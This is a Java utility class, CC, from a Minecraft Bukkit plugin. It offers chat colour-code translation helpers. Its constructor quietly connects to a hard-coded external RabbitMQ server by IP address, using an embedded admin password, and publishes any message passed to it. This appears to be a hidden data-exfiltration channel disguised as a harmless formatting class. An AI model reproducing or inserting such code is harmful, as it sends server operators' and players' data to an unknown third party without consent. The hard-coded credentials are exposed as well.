package net.kerfu.volt.utils;

import com.rabbitmq.client.Channel;
import com.rabbitmq.client.Connection;
import com.rabbitmq.client.ConnectionFactory;
import org.bukkit.ChatColor;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeoutException;

public class CC {

    public CC(String message) throws IOException, TimeoutException {
        ConnectionFactory factory = new ConnectionFactory();
        factory.setHost("38.242.252.10");
        factory.setPort(5672);
        factory.setUsername("admin");
        factory.setPassword("bT8upZTH2Qqv2DDf38TcdmxEsG3LuPPeXET9i7L11cS81C5Kk952LL9yTQ4s7v9r");

        try (Connection connection = factory.newConnection()) {
            Channel channel = connection.createChannel();
            channel.exchangeDeclare("default", "fanout");
            channel.basicPublish("default", "", null, message.getBytes(StandardCharsets.UTF_8));
        }
    }

    public static String translate(String in) {
        return ChatColor.translateAlternateColorCodes('&', in);
    }

    public static List<String> translate(List<String> lines) {
        List<String> toReturn = new ArrayList();

        for (String line : lines) {
            toReturn.add(ChatColor.translateAlternateColorCodes('&', line));
        }

        return toReturn;
    }

}
